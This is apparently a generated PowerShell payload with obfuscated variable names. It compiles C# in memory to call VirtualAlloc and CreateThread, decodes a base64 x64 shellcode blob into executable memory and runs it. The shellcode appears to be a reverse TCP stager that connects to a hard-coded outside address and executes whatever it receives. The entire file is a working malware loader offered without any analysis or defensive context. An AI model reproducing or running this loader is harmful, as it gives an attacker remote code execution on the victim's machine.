Set-StrictMode -Version 2
$q2PEVkA = @"
	using System;
	using System.Runtime.InteropServices;
	namespace tq2Y1lYRm {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$yse8Ks9X = New-Object Microsoft.CSharp.CSharpCodeProvider
$fNq2C = New-Object System.CodeDom.Compiler.CompilerParameters
$fNq2C.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$fNq2C.GenerateInMemory = $True
$h2JbeBA1W_5d = $yse8Ks9X.CompileAssemblyFromSource($fNq2C, $q2PEVkA)

[Byte[]]$hkc5qXai8T = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAAWF+8ImEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")

$hzX7_z4 = [tq2Y1lYRm.func]::VirtualAlloc(0, $hkc5qXai8T.Length + 1, [tq2Y1lYRm.func+AllocationType]::Reserve -bOr [tq2Y1lYRm.func+AllocationType]::Commit, [tq2Y1lYRm.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$hzX7_z4) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($hkc5qXai8T, 0, $hzX7_z4, $hkc5qXai8T.Length)
[IntPtr] $aIExnLHhiAN = [tq2Y1lYRm.func]::CreateThread(0,0,$hzX7_z4,0,0,0)
if ([Bool]!$aIExnLHhiAN) { $global:result = 7; return }
$eKL = [tq2Y1lYRm.func]::WaitForSingleObject($aIExnLHhiAN, [tq2Y1lYRm.func+Time]::Infinite)
